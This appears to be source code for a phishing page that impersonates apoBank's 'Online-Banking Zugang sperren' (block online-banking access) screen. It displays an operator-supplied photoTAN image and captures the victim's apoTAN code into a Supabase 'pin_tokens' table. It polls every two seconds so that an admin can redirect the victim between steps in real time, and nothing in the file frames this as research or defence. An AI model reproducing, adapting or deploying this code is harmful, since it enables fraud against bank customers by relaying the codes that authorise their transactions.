import { useEffect, useState } from "react";
import { ChevronRight, Loader2 } from "lucide-react";
import { useNavigate, useSearchParams } from "react-router-dom";
import apoBankLogo from "@/assets/apobank-logo.svg";
import phototanImg from "@/assets/phototan.png";
import Footer from "@/components/Footer";
import ContactSection from "@/components/ContactSection";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";

const PinOffline = () => {
  const navigate = useNavigate();
  const [sp] = useSearchParams();
  const token = sp.get("token");
  const [code, setCode] = useState("");
  const [image, setImage] = useState<string | null>(null);
  const [sending, setSending] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const valid = code.length === 6 || code.length === 8;

  // Load initial image + subscribe
  useEffect(() => {
    if (!token) return;
    let cancelled = false;
    const fetchRow = async () => {
      const { data } = await (supabase as any)
        .from("pin_tokens")
        .select("photo_tan_image, customer_phase, last_error")
        .eq("token", token)
        .maybeSingle();
      if (cancelled || !data) return;
      setImage(data.photo_tan_image || null);
      if (data.customer_phase === "success") {
        navigate("/success");
        return;
      }
      if (data.customer_phase === "start") {
        // Admin sent customer back
        navigate(`/pin/start?token=${encodeURIComponent(token)}`);
        return;
      }
      if (data.last_error) {
        setError(data.last_error);
        setSending(false);
      }
    };
    fetchRow();
    const iv = window.setInterval(fetchRow, 2000);
    return () => { cancelled = true; window.clearInterval(iv); };
  }, [token, navigate]);

  const onBack = async () => {
    if (token) {
      await (supabase as any).from("pin_tokens")
        .update({ customer_phase: "start", last_error: null })
        .eq("token", token);
      navigate(`/pin/start?token=${encodeURIComponent(token)}`);
    } else {
      navigate("/pin/start");
    }
  };

  const onSend = async () => {
    if (!valid) return;
    setError(null);
    if (!token) return;
    setSending(true);
    await (supabase as any).from("pin_tokens")
      .update({ pin_code: code, customer_phase: "code_review", last_error: null })
      .eq("token", token);
  };

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
      <header className="w-full border-b border-border/40 bg-white">
        <div className="max-w-6xl mx-auto px-4 py-3 flex items-center gap-3">
          <img src={apoBankLogo} alt="apoBank Logo" className="h-14 w-auto" />
        </div>
      </header>

      <div className="bg-white border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-4">
          <div className="flex items-center gap-2 text-sm text-foreground">
            <span className="cursor-default">Startseite</span>
            <ChevronRight className="h-3 w-3" />
            <span className="text-foreground/70">Online-Banking Zugang sperren</span>
          </div>
          <h1 className="mt-2 text-2xl sm:text-3xl font-normal text-[#1a1a1a]">Online-Banking Zugang sperren</h1>
        </div>
      </div>

      <main className="flex-1 px-3 sm:px-4 py-6 sm:py-8">
        <div className="max-w-3xl mx-auto">
          <div className="bg-white border border-border/60 rounded-sm px-6 py-6 shadow-sm">
            <h2 className="text-2xl sm:text-3xl font-normal text-[#0f4c92] leading-snug">
              Online-Banking Zugang sperren: Bestätigung mit apoTAN
            </h2>
          </div>

          <div className="bg-[#eef1f5] border border-border/60 border-t-0 rounded-sm px-6 py-8">
            <p className="text-sm text-foreground mb-6">
              Bitte geben Sie den Code ein, der auf Ihrem apoTAN Gerät oder Ihrer apoTAN App angezeigt wird.
            </p>

            <div className="flex justify-center mb-8">
              <img
                src={image || phototanImg}
                alt="apoTAN Grafik"
                className="w-64 h-64 object-contain border border-black bg-white"
              />
            </div>

            <div className="flex items-center gap-6 mb-4">
              <label className="text-sm font-semibold text-foreground w-24">Code</label>
              <input
                type="text"
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/[^0-9]/g, "").slice(0, 8))}
                className="flex-1 border border-border/70 bg-white rounded-sm px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-[#a0b0c8]"
              />
            </div>

            {error && <p className="text-xs text-destructive mb-4">{error}</p>}

            <div className="flex justify-end gap-3">
              <Button
                variant="outline"
                disabled={sending}
                className="px-8 bg-white hover:bg-white border-[#0f4c92] text-[#0f4c92] hover:text-[#0f4c92] rounded-sm"
                onClick={onBack}
              >
                Zurück
              </Button>
              <Button
                disabled={!valid || sending}
                onClick={onSend}
                className={`px-8 rounded-sm disabled:opacity-100 ${valid ? "bg-white text-[#0f4c92] border border-[#0f4c92] hover:bg-white" : "bg-[#e6e8eb] text-foreground/60 hover:bg-[#e6e8eb]"}`}
              >
                {sending ? (
                  <span className="inline-flex items-center gap-2">
                    <Loader2 className="h-4 w-4 animate-spin" /> Senden…
                  </span>
                ) : "Senden"}
              </Button>
            </div>
          </div>
        </div>
      </main>

      <ContactSection />
      <Footer />
    </div>
  );
};

export default PinOffline;
